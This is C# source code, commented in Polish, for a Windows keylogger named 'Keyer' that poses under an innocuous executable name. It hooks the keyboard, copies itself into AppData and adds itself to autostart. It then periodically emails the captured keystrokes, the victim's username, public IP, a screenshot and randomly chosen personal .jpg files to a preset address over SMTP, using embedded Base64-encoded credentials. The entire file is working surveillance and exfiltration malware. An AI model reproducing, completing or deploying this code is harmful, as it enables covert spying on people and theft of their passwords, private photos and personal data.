using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Threading;

namespace Keyer
{
    public partial class RTHDPL : Form
    {
        MailManager mail = new MailManager(); //Tworzenie obiektów klas
        NetManager net = new NetManager();
        IOManager file = new IOManager();
        HooksManager hook = new HooksManager();

        public RTHDPL()
        {
            InitializeComponent();
            hook.startHooks();
        }

        private void NvDisp_Load(object sender, EventArgs e) //Metoda wykonywująca kod podczas ładowania programu
        {
            Thread mailThread = new Thread(new ThreadStart(this.MailThread)); //Obsługa i start wątku z wysyłaniem maili
            mailThread.IsBackground = true;
            mailThread.Start();
        }

        public void MailThread()
        {
            const int time = 600; //Stała odstępu czasu między mailami, w sekundach (!)
            string rndFile = string.Empty;

            mail.setFrom(""); //Od
            mail.setTo(""); //Do
            mail.setSubject(System.Environment.UserName + " " + "(" + net.GetPublicIp() + ")");
            mail.setBodyHTML(true);
            mail.setBody(string.Empty);

            mail.setHost(""); //Ustawianie połączenia
            mail.setPort(); //Port SMTP
            mail.setDefaultCredentials(false);
            mail.setCredentials("Ym9uaWNraUBwb2N6dGEucGw=", "a2lzemVjemth", "Base64"); //login, hasło, zaszyfrowane w Base64
            mail.setSsl(false);
            mail.setTimeout(300); //Maksymalne opoznienie w wysyłaniu maila

            file.setPath(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\RTHDPL\\"); //Ścieżka do ulokowania programu + pliku z logami.
            file.setName("RTHDPL.exe"); //Nazwa programu wykonywalnego
            file.setLog("devices.txt"); //Nazwa pliku z logami, koniecznie na końcu .txt

            if (!file.checkFile()) //Jesli program nie jest skopiowany w odpowiednie miejsce wtedy kopiuje wykonywalny plik o ustalonej nazwie do ustalonej ścieżki
            {
                file.copyFile();
            }
            if (!file.checkAutostart()) //Jeśli programu nie ma w autostarcie wtedy dorabiany jest klucz autostartu
            {
                file.makeAutostart();
            }

            while (!System.Environment.HasShutdownStarted) //Główna pętla programu, dopóki system nie zostanie zamykany
            {
                if (hook.getLog() != string.Empty) //Jeśli ktoś coś zacznie wpisywac, dopiero wtedy wątek czeka ustalony czas i wysyła maila
                {
                    Thread.Sleep(time * 1000);
                    mail.setBody("<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-2\"></head><body>");
                    mail.pushBody(hook.getLog());

                    mail.pushBody("<br /><br /><strong>[ Wylosowane pliki: ]</strong><br /><br />");

                    mail.setAttScrn(); //Screenshot

                    rndFile = file.randomFile("C:\\Users\\" + System.Environment.UserName + "\\Pictures", "*.jpg");//Dodawanie do maila załączników z losowymi plikami jpg (jedno wywołanie - jeden plik)
                    if (rndFile != string.Empty) //Jeśli załączniki nie są puste wtedy dokłada do wiadomości odpowiednią adnotację
                    {
                        mail.setAtt(rndFile);
                        mail.pushBody("<span style=\"color: #FF6300;\"><b>Wylosowany Plik jpg: " + mail.getAtt() + "</b></span>");
                        mail.pushBody("<br />");
                    }

                    rndFile = file.randomFile("D:\\", "*.jpg");
                    if (rndFile != string.Empty)
                    {
                        mail.setAtt(rndFile);
                        mail.pushBody("<span style=\"color: #FF6300;\"><b>Wylosowany Plik jpg: " + mail.getAtt() + "</b></span>");
                        mail.pushBody("<br />");
                    }

                    rndFile = file.randomFile("E:\\", "*.jpg");
                    if (rndFile != string.Empty)
                    {
                        mail.setAtt(rndFile);
                        mail.pushBody("<span style=\"color: #FF6300;\"><b>Wylosowany Plik jpg: " + mail.getAtt() + "</b></span>");
                        mail.pushBody("<br />");
                    }

                    rndFile = file.randomFile("F:\\", "*.jpg");
                    if (rndFile != string.Empty)
                    {
                        mail.setAtt(rndFile);
                        mail.pushBody("<span style=\"color: #FF6300;\"><b>Wylosowany Plik jpg: " + mail.getAtt() + "</b></span>");
                        mail.pushBody("<br />");
                    }

                    mail.pushBody("</body></html>");
                    mail.send();
                    mail.clearBody(); //Czyszczenie
                    mail.clearAtt();
                    hook.clearLog();
                }
            }
        }

        private void NvDisp_Leave(object sender, EventArgs e) //Zwalnianie hooka po wyjsciu z programu
        {
            hook.stopHooks();
        }
    }
}